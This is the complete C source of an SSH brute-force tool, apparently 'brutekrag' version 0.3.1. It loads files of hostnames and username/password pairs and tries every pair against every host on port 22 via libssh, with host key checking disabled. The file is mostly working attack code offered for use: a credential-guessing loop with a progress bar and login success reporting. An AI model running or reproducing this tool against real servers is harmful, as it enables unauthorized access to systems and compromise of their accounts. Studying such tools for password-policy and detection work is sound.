#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <assert.h>

#define BUFFSIZE 1024

typedef struct {
    char *hostname;
    char *username;
    char *password;
} intento_t;

typedef struct {
    size_t lenght;
    char **words;
} wordlist_t;

int verbose = 0;

char** str_split(char* a_str, const char a_delim)
{
    char** result = 0;
    size_t count = 0;
    char* tmp = a_str;
    char* last_comma = 0;
    char delim[2];
    delim[0] = a_delim;
    delim[1] = 0;

    /* Count how many elements will be extracted. */
    while (*tmp) {
        if (a_delim == *tmp) {
            count++;
            last_comma = tmp;
        }
        tmp++;
    }

    /* Add space for trailing token. */
    count += last_comma < (a_str + strlen(a_str) - 1);

    /* Add space for terminating null string so caller
       knows where the list of returned strings ends. */
    count++;

    result = malloc(sizeof(char*) * count);

    if (result) {
        size_t idx  = 0;
        char* token = strtok(a_str, delim);

        while (token) {
            assert(idx < count);
            *(result + idx++) = strdup(token);
            token = strtok(0, delim);
        }
        assert(idx == count - 1);
        *(result + idx) = 0;
    }

    return result;
}

void print_error(char *message)
{
    printf("\033[91m%s\033[0m\n", message);
}

void print_debug(char *message)
{
    if (verbose)
    printf("\033[37m%s\033[0m\n", message);
}

const char *str_repeat(char *str, size_t times)
{
    if (times < 1) return NULL;
    char *ret = malloc(sizeof(str) * times + 1);
    if (ret == NULL) return NULL;
    strcpy(ret, str);
    while (--times > 0) {
        strcat(ret, str);
    }
    return ret;
}

void update_progress(int count, int total, char* suffix, int bar_len)
{
    if (bar_len < 0) bar_len = 60;
    if (suffix == NULL) suffix = "";

    int filled_len = bar_len * count / total;
    int empty_len = bar_len - filled_len;
    float percents = 100.0f * count / total;

    printf("\033[37m[");
    if (filled_len > 0) printf("\033[32m%s", str_repeat("=", filled_len));
    printf("\033[37m%s\033[37m]\033[0m", str_repeat("-", empty_len));
    printf("  %.2f%%   %s\r", percents, suffix);
    fflush(stdout);
}

void print_banner()
{
    printf(
        "\033[92m      _                _       _\n"
        "     | |              | |     | |\n"
        "     | |__  _ __ _   _| |_ ___| | ___ __ __ _  __ _\n"
        "     | '_ \\| '__| | | | __/ _ \\ |/ / '__/ _` |/ _` |\n"
        "     | |_) | |  | |_| | ||  __/   <| | | (_| | (_| |\n"
        "     |_.__/|_|   \\__,_|\\__\\___|_|\\_\\_|  \\__,_|\\__, |\n"
        "            \033[0m\033[1mOpenSSH Brute force tool 0.3.1\033[92m     __/ |\n"
        "          \033[0m(c) Copyright 2014 Jorge Matricali\033[92m  |___/\033[0m\n\n"
    );
}

int try_login(const char *hostname, const char *username, const char *password)
{
    ssh_session my_ssh_session;
    int verbosity = 0;
    int port = 22;
    long timeout = 3;

    if (verbose) {
        verbosity = SSH_LOG_PROTOCOL;
    } else {
        verbosity = SSH_LOG_NOLOG;
    }

    my_ssh_session = ssh_new();

    if (my_ssh_session == NULL) {
        return -1;
    }

    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, hostname);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_KEY_EXCHANGE, NULL);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOSTKEYS, NULL);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_TIMEOUT, &timeout);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_STRICTHOSTKEYCHECK, 0);

    ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, username);



    int r;
    r = ssh_connect(my_ssh_session);
    if (r != SSH_OK) {
        ssh_free(my_ssh_session);
        if (verbose) {
            fprintf(
                stderr,
                "Error connecting to %s: %s\n",
                hostname,
                ssh_get_error(my_ssh_session)
            );
        }
        return -1;
    }

    r = ssh_userauth_password(my_ssh_session, username, password);
    if (r != SSH_AUTH_SUCCESS) {
        if (verbose) {
            fprintf(
                stderr,
                "Error authenticating with password: %s\n",
                ssh_get_error(my_ssh_session)
            );
        }
        ssh_disconnect(my_ssh_session);
        ssh_free(my_ssh_session);
        return -1;
    }

    ssh_disconnect(my_ssh_session);
    ssh_free(my_ssh_session);
    return 0;
}

wordlist_t load_wordlist(char *filename)
{
    FILE* fp;
    wordlist_t ret;
    char **words = NULL;
    ssize_t read;
    char *temp = 0;
    size_t len;

    fp = fopen(filename, "r");
    if (fp == NULL) {
        fprintf(stderr, "Error opening file. (%s)\n", filename);
        exit(EXIT_FAILURE);
    }

    for (int i = 0; (read = getline(&temp, &len, fp)) != -1; i++) {
        strtok(temp, "\n");
        if (words == NULL) {
            words = malloc(sizeof(temp));
            *words = strdup(temp);
        } else {
            words = realloc(words, sizeof(temp) * (i + 1));
            *(words + i) = strdup(temp);
        }
        ret.lenght = i + 1;
    }
    fclose(fp);

    ret.words = words;

    return ret;
}

int main(int argc, char** argv)
{
    int opt;
    int total = 0;

    while ((opt = getopt(argc, argv, "vT")) != -1) {
        switch (opt) {
            case 'v':
                verbose = 1;
                break;
            case 'T':
                verbose = 1;
                break;
            default:
            fprintf(stderr, "Usage: %s [-ilw] [file...]\n", argv[0]);
            exit(EXIT_FAILURE);
        }
    }
    print_banner();


    wordlist_t hostnames = load_wordlist("hostnames.txt");
    wordlist_t combos = load_wordlist("combos.txt");
    total = hostnames.lenght * combos.lenght;

    printf("\nCantidad de combos: %zu\n", combos.lenght);
    printf("Cantidad de hostnames: %zu\n", hostnames.lenght);
    printf("Combinaciones totales: %d\n\n", total);

    int count = 0;
    for (int x = 0; x < combos.lenght; x++) {
        char **login_data = str_split(combos.words[x], ' ');
        if (login_data == NULL) {
            continue;
        }
        // strtok(login_data[1], "$BLANKPASS");
        for (int y = 0; y < hostnames.lenght; y++) {
            if (verbose) {
                printf(
                    "HOSTNAME=%s\tUSUARIO=%s\tPASSWORD=%s\n",
                    hostnames.words[y],
                    login_data[0],
                    login_data[1]
                );
            }
            char *bar_suffix = 0;
            // snprintf(bar_suffix, 4, "[%d] %s %s %s", count, hostnames.words[y], login_data[0], login_data[1]);
            update_progress(count, total, bar_suffix, 80);
            int ret = try_login(hostnames.words[y], login_data[0], login_data[1]);
            if (verbose) {
                if (ret == 0) {
                    printf("\n\nLogin correcto\n");
                } else {
                    printf("\n\nLogin incorrecto\n");
                }
            }
            count++;
        }
    }

    exit(EXIT_SUCCESS);
}